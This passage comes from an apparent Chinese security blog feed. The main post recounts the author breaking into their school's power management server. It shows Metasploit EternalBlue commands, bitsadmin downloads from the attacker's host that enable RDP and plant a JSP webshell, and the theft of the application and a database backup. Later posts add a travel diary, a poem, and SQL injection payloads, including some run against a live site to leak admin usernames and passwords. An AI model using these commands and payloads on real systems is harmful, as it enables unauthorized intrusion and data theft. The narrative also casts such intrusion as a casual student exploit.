x64）可以成功利用：</p><p><strong>该主机关键信息：</strong></p><p><strong>8080</strong> 端口运行着tomcat的服务，<strong>3389</strong> 端口未开放，<strong>3306</strong> 运行MySQL服务，其他端口暂不考虑。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use <span class="hljs-keyword">for</span> authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password <span class="hljs-keyword">for</span> the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    <span class="hljs-literal">true</span>             yes       Check <span class="hljs-keyword">if</span> remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  <span class="hljs-literal">true</span>             yes       Check <span class="hljs-keyword">if</span> remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> rhosts 10.10.10.104</span><br><span class="line">rhosts =&gt; 10.10.10.104</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure><p>如下图成功返回了一个CmdShell，而且还直接是System权限，不过比较疑惑的是，tasklist /SVC 看了下当前进程，有360的主动防御，按道理应该会拦截住的，可能我运气好吧2333：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.04.01/3.png" alt="3"></p><h2 id="cmdshell升级meterpreter（失败）"><a href="#cmdshell升级meterpreter（失败）" class="headerlink" title="cmdshell升级meterpreter（失败）"></a>cmdshell升级meterpreter（失败）</h2><p>由于cmdshell不如meterpreter好用（meterpreter功能比较强大），尝试升级成meterpreter</p><p>第一种方法：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; use post/multi/manage/shell_to_meterpreter </span><br><span class="line">msf5 post(multi/manage/shell_to_meterpreter) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/shell_to_meterpreter):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   HANDLER  <span class="hljs-literal">true</span>             yes       Start an exploit/multi/handler to receive the connection</span><br><span class="line">   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).</span><br><span class="line">   LPORT    4433             yes       Port <span class="hljs-keyword">for</span> payload to connect to.</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">msf5 post(multi/manage/shell_to_meterpreter) &gt; <span class="hljs-built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf5 post(multi/manage/shell_to_meterpreter) &gt; run</span><br></pre></td></tr></table></figure><p>第二种方法：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -u 1</span><br></pre></td></tr></table></figure><p>然后不知道为什么失败了（换个思路吧）：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.04.01/4.png" alt="4"></p><h2 id="远程文件下载："><a href="#远程文件下载：" class="headerlink" title="远程文件下载："></a>远程文件下载：</h2><p>windows自带的远程文件下载功能很强大，需要用什么就远程下载什么好了。</p><p><strong>一开始就想直接开端口，加账号登陆，没想到远程连接出现问题了，然后又想到可以拿下shell试试</strong></p><h3 id="开启远程连接"><a href="#开启远程连接" class="headerlink" title="开启远程连接"></a>开启远程连接</h3><p>本机开一个apache服务，把 3389.bat 放到 /var/www/html 下，cmdshell 里执行，下载成功后，运行3389.bat</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://IP/open3389.bat c:\windows\3389.bat</span><br></pre></td></tr></table></figure><p>运行完毕后(记得删除)，发现3389端口已经开启了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.04.01/5.png" alt="5"></p><p>Kali下连接远程桌面出了点小问题，百度了下，也没讲多清楚（暂时就放弃了）。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.04.01/6.png" alt="6"></p><p>不过后来换到win系统上好像就没问题了，因为当时就想着还是怎么方便怎么来（实体机运行的kali，换回win还得切系统），也就没抓密码。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.04.01/7.png" alt="7"></p><h3 id="尝试GetShell"><a href="#尝试GetShell" class="headerlink" title="尝试GetShell"></a>尝试GetShell</h3><p>先找到web所在目录(带空格的目录记得用双引号)：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir c:\</span><br><span class="line">dir <span class="hljs-string">"c:\Program Files\"</span></span><br><span class="line"><span class="hljs-string">...</span></span><br><span class="line"><span class="hljs-string">dir "</span>c:\Program Files\Apache Software Foundation\Tomcat 7.0\webapps\eleServer\"</span><br></pre></td></tr></table></figure><p>看后台应该是个电力管理系统：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.04.01/8.png" alt="8"></p><p>最后决定将shell放在该系统ui框架的某目录下了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.04.01/9.png" alt="9"></p><p>同样用远程文件下载jsp大马到该目录下</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://IP/xieying.jsp <span class="hljs-string">"c:\Program Files\Apache Software Foundation\Tomcat 7.0\webapps\eleServer\BJUI\plugins\xieying.jsp"</span></span><br></pre></td></tr></table></figure><p>浏览器上访问大马并登陆：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.04.01/10.png" alt="10"></p><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>感觉再弄无非就是远程登陆，没什么必要，翻了翻系统文件，就把这个电力系统的war包，还有备份的数据库拿了下来，本地自己搭建下，应该就能得到系统的账号密码了。</p><p>删了shell，我还是个听话的好学生。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.04.01/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;”黑“掉自己的学校，可能是大多数黑阔们学生时代共同的执念。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://www.se7ensec.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>古北水镇小记</title>
    <link href="https://www.se7ensec.cn/2019/03/30/%E5%8F%A4%E5%8C%97%E6%B0%B4%E9%95%87%E5%B0%8F%E8%AE%B0/"/>
    <id>https://www.se7ensec.cn/2019/03/30/古北水镇小记/</id>
    <published>2019-03-30T14:56:44.000Z</published>
    <updated>2019-03-31T17:37:34.835Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.30/gbsz.jpg" alt="古北水镇"></p><blockquote><p>去水镇的计划很早之前就想好了，最近几天才有时间，去到了哪里以后，无论是风景还是环境只能用惊艳来形容。</p></blockquote><a id="more"></a><p>去之前选的住宿是民宿，在附近的一个民俗村里，距离水镇不到两公里，来回都有车接送所以很方便。房东大姐热情又实在，住的很舒服。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.30/1.jpg" alt="1"></p><p>来到景点门口的第一眼就被美到了，蓝天白云，青山绿水，配上十分古朴的建筑风格，有种世外桃源的感觉。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.30/2.jpg" alt="2"></p><p>偶然发现一处台阶上的涂鸦，完美的诠释了水镇的主题。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.30/3.jpg" alt="3"></p><p>这是在永顺染坊拍的，说实话，近门第一眼看到挂着一堆布条还挺诡异的，不过上到二楼风景还是很好的。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.30/4.jpg" alt="4"></p><p>在路上遇见一只橘猫，哇，这个猫聪明的简直不配做个喵星人，想喂它点吃的，刚一拿包，它就主动过来对我们喵喵叫，一点也不怕生人，估计人家靠脸吃饭不是一次两次了吧（突然感觉自己还不如一只喵）。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.30/5.jpg" alt="5"></p><p>这是一个镖局的比武场，里面有点武器，外面有梅花桩，人形桩什么的，不过好像也没啥特别的地方。。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.30/6.jpg" alt="6"></p><p>太阳刚落山，灯光也都亮了起来，傍晚的水镇像是换上了一件新的衣服，比起白天又是另一种美。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.30/7.jpg" alt="7"></p><p>后来跑到了白天已经踩好点的一个山顶上，感觉这里应该是水镇最高，视野最开阔的地方了，整个小镇的景色一览无余，尽收眼底，虽然是晚上，但是没有一条路是没有灯的，胆子小的不用害怕，随便玩随便走。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.30/8.jpg" alt="8"></p><p>走之前最后一张照片，这里是入口也是出口。虽然玩了一天有些累，心请还是特别放松的。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.30/9.jpg" alt="9"></p><p>第二天早起要离开了，阳光很好也没什么风，感觉比昨天要暖和太多了，留个“影”走喽~</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.30/10.jpg" alt="10"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.30/gbsz.jpg&quot; alt=&quot;古北水镇&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;去水镇的计划很早之前就想好了，最近几天才有时间，去到了哪里以后，无论是风景还是环境只能用惊艳来形容。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="旅行" scheme="https://www.se7ensec.cn/tags/%E6%97%85%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>可我浪费着我寒冷的年华</title>
    <link href="https://www.se7ensec.cn/2019/03/25/%E5%8F%AF%E6%88%91%E6%B5%AA%E8%B4%B9%E7%9D%80%E6%88%91%E5%AF%92%E5%86%B7%E7%9A%84%E5%B9%B4%E5%8D%8E/"/>
    <id>https://www.se7ensec.cn/2019/03/25/可我浪费着我寒冷的年华/</id>
    <published>2019-03-25T14:30:44.000Z</published>
    <updated>2019-03-25T14:48:33.117Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.25/sad.jpg" alt="sad"></p><blockquote><p>每个人都是一段故事，或许悲伤，或许快乐。</p></blockquote><a id="more"></a><p>小七是一个不太喜欢表达情绪的人，</p><p>开心的时候笑一笑，</p><p>不开心的时候也会笑一笑。</p><p>长此以往，</p><p>以至于自己也分不清，</p><p>有些事到底是开心还是不开心。</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=30814948&auto=1&height=66"></iframe>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.25/sad.jpg&quot; alt=&quot;sad&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;每个人都是一段故事，或许悲伤，或许快乐。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>MySQL不知道列名情况下的注入</title>
    <link href="https://www.se7ensec.cn/2019/03/21/MySQL%E4%B8%8D%E7%9F%A5%E9%81%93%E5%88%97%E5%90%8D%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.se7ensec.cn/2019/03/21/MySQL不知道列名情况下的注入/</id>
    <published>2019-03-21T14:30:24.000Z</published>
    <updated>2019-03-21T16:46:51.698Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2018.9.12/sql.jpg" alt="SQLinjection"></p><blockquote><p>最近感觉脑子空空，全在为了刷洞去挖洞，还是回归技术的本身让自己舒服些。</p></blockquote><a id="more"></a><h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>以下情况适用于 MySQL &lt; 5版本，或者在 MySQL &gt;= 5 的版本[存在information_schema库]，且已获取到<strong>库名</strong>和<strong>表名</strong></p><p>① 当只能获取到表名，获取不到列名或者只能获取到无有效内容的列名情况【例如 id】 </p><p>② 当希望通过information_schema库中的表去获取其他表的结构，即表名、列名等，但是这个库被WAF过滤掉的情况</p><p>其实个人感觉这个方法还是对 5 版本以下的实用性比较强一些，因为对我来说，一般遇到waf就放弃了（菜的真实23333）</p><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><h2 id="正常的查询："><a href="#正常的查询：" class="headerlink" title="正常的查询："></a>正常的查询：</h2><p>以下是正常查询 test 库中的 user 表内容</p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.21/1.png" alt="1"></p><h2 id="UNION查询"><a href="#UNION查询" class="headerlink" title="UNION查询:"></a>UNION查询:</h2><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.21/2.png" alt="2"></p><h2 id="数字对应列查询："><a href="#数字对应列查询：" class="headerlink" title="数字对应列查询："></a>数字对应列查询：</h2><p>可以使用数字来对应列来进行查询，如 2 对应了表里面的 name 列</p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-string">`2`</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>)a;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.21/3.png" alt="3"></p><h2 id="别名代替查询："><a href="#别名代替查询：" class="headerlink" title="别名代替查询："></a>别名代替查询：</h2><p>当反引号 ` 不能使用的时候，可以使用别名来代替，如设置 2 的别名为 b  </p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> b <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>)a;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.21/4.png" alt="4"></p><h2 id="多列合并查询："><a href="#多列合并查询：" class="headerlink" title="多列合并查询："></a>多列合并查询：</h2><p>同上：这里反引号不能用的话，一样可以使用别名代替 </p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">concat</span>(<span class="hljs-string">`2`</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-string">`3`</span>) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>)a <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.21/5.png" alt="5"></p><p><strong>仅作翻译以及思路整理</strong></p><p><strong>原文链接：<a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/r00tSe7en/pictures/master/2018.9.12/sql.jpg&quot; alt=&quot;SQLinjection&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;最近感觉脑子空空，全在为了刷洞去挖洞，还是回归技术的本身让自己舒服些。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="https://www.se7ensec.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>人品爆发：偏移注入与移位溢注的联合使用</title>
    <link href="https://www.se7ensec.cn/2019/03/11/%E4%BA%BA%E5%93%81%E7%88%86%E5%8F%91%E4%B9%8B%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5%E4%B8%8E%E7%A7%BB%E4%BD%8D%E6%BA%A2%E6%B3%A8%E7%9A%84%E8%81%94%E5%90%88%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.se7ensec.cn/2019/03/11/人品爆发之偏移注入与移位溢注的联合使用/</id>
    <published>2019-03-11T13:30:24.000Z</published>
    <updated>2019-03-21T17:06:27.108Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2018.9.12/sql.jpg" alt></p><blockquote><p>理解一个东西，然后去发散思维思考，总会有意想不到的收获。</p></blockquote><a id="more"></a><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>这个灵感是我突然冒出来的，最近有一个只能出来表名的站，一直没的机会实战，正好练习一下偏移注入和移位溢注，顺便总结一下,结果偏移注入成功了，移位溢注倒是不行了，心有不甘（我人品有这么差么？），才有了下文。</p><p>偏移注入，移位溢注的正常的手法，原理在这里就不写了，描述下站点大概情况，方便大家了解，懂得自然懂。</p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 12 - 正常 </span><br><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,* <span class="hljs-keyword">from</span> tbladmin - 正常</span><br></pre></td></tr></table></figure><p>显示位</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.11/1.png" alt="1"></p><h1 id="开始移位溢注："><a href="#开始移位溢注：" class="headerlink" title="开始移位溢注："></a>开始移位溢注：</h1><p>当我使用移位溢注时，遇到了一点小麻烦：</p><h2 id="2-1-先测试位置显示位6（失败）："><a href="#2-1-先测试位置显示位6（失败）：" class="headerlink" title="2.1 先测试位置显示位6（失败）："></a>2.1 先测试位置显示位6（失败）：</h2><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,tbladmin.*,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span> <span class="hljs-keyword">from</span> tbladmin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.11/2.png" alt="2"></p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,tbladmin.*,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span> <span class="hljs-keyword">from</span> tbladmin <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> - 返回同上</span><br><span class="line"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,tbladmin.*,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span> <span class="hljs-keyword">from</span> tbladmin <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">2</span> - 发布时间处:<span class="hljs-number">1</span>变成了<span class="hljs-number">2</span></span><br><span class="line">...</span><br><span class="line"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,tbladmin.*,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span> <span class="hljs-keyword">from</span> tbladmin <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=n - 开始一直返回正常页面了</span><br></pre></td></tr></table></figure><h2 id="2-2-然后测试显示位2和3-失败-："><a href="#2-2-然后测试显示位2和3-失败-：" class="headerlink" title="2.2 然后测试显示位2和3(失败)："></a>2.2 然后测试显示位2和3(失败)：</h2><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,tbladmin.*,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span> <span class="hljs-keyword">from</span> tbladmin - 爆出了一个用户名</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.11/3.png" alt="3"></p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,tbladmin.*,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span> <span class="hljs-keyword">from</span> tbladmin <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> - 返回内容同上</span><br><span class="line"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,tbladmin.*,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span> <span class="hljs-keyword">from</span> tbladmin <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">2</span> - 如下图，一个新的用户名</span><br><span class="line">...</span><br><span class="line"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,tbladmin.*,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span> <span class="hljs-keyword">from</span> tbladmin <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=n - 开始一直返回正常页面了</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.11/4.png" alt="4"></p><p>到了现在，可以发现问题出现了，移位溢注的招式已经用完了，但是显示位明显不够啊，还是爆不出来密码，这样看来，移位溢注还是不能完全和人品说拜拜</p><h1 id="联合使用出奇效："><a href="#联合使用出奇效：" class="headerlink" title="联合使用出奇效："></a>联合使用出奇效：</h1><p><strong>偏移注入的本质是：打乱显示顺序</strong></p><p><strong>移位溢注的本质是：占用多处显位</strong></p><p>都是为了有一定概率让账号密码出现在显示位上，那么<strong>联合起来</strong>会怎么样呢？下面语句不做分析，还是懂的人自然懂</p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,a.*,b.*, * <span class="hljs-keyword">from</span> (tbladmin <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.11/5.png" alt="5"></p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,a.*, * <span class="hljs-keyword">from</span> (tbladmin <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id) - 显示结果同上</span><br><span class="line"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,a.*,<span class="hljs-number">4</span>, * <span class="hljs-keyword">from</span> (tbladmin <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id) - 出现密码了</span><br></pre></td></tr></table></figure><p><img 